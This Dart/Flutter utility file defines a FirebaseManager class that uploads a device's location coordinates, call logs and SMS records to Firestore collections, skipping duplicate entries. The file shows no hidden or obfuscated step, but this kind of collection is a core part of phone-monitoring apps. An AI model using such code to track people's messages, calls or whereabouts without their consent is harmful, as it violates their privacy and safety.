// lib/core/utils/firebase_manager.dart

import 'package:cloud_firestore/cloud_firestore.dart';

class FirebaseManager {
  static final FirebaseFirestore _firestore = FirebaseFirestore.instance;

  static Future<void> syncLocationData(Map<String, dynamic> locationData) async {
    try {
      // Extract userId, latitude, and longitude from locationData
      String userId = locationData['userId'];
      double latitude = locationData['latitude'];
      double longitude = locationData['longitude'];

      // Query Firestore to check if a location already exists for the current user with the same coordinates
      var querySnapshot = await _firestore
          .collection('locations')
          .where('userId', isEqualTo: userId)
          .where('latitude', isEqualTo: latitude)
          .where('longitude', isEqualTo: longitude)
          .get();

      // If no matching document is found, add the location data
      if (querySnapshot.docs.isEmpty) {
        await _firestore.collection('locations').add(locationData);
        print("Location data synced to Firestore.");
      } else {
        print("Duplicate location found for user $userId, skipping sync.");
      }
    } catch (e) {
      print("Error syncing location data to Firestore: $e");
    }
  }


  static Future<void> syncCallLogData(Map<String, dynamic> callLogData) async {
    try {
      // Check if a call log entry with the same timestamp already exists
      var querySnapshot = await _firestore
          .collection('callLogs')
          .where('timestamp', isEqualTo: callLogData['timestamp'])
          .get();

      // If no documents match, this is a new entry, so add it
      if (querySnapshot.docs.isEmpty) {
        await _firestore.collection('callLogs').add(callLogData);
      } else {
        print("Duplicate call log found, skipping sync.");
      }
    } catch (e) {
      print("Error syncing call log data to Firestore: $e");
    }
  }

  static Future<void> syncSmsData(Map<String, dynamic> smsData) async {
    print("Sync SMS to Server...........................");
    try {
      // Check if an SMS entry with the same timestamp already exists
      var querySnapshot = await _firestore
          .collection('smsLogs')
          .where('timestamp', isEqualTo: smsData['timestamp'])
          .get();

      // If no documents match, this is a new entry, so add it
      if (querySnapshot.docs.isEmpty) {
        await _firestore.collection('smsLogs').add(smsData);
        print("SMS data synced to Firestore.");
      } else {
        print("Duplicate SMS log found, skipping sync.");
      }
    } catch (e) {
      print("Error syncing SMS data to Firestore: $e");
    }
  }
}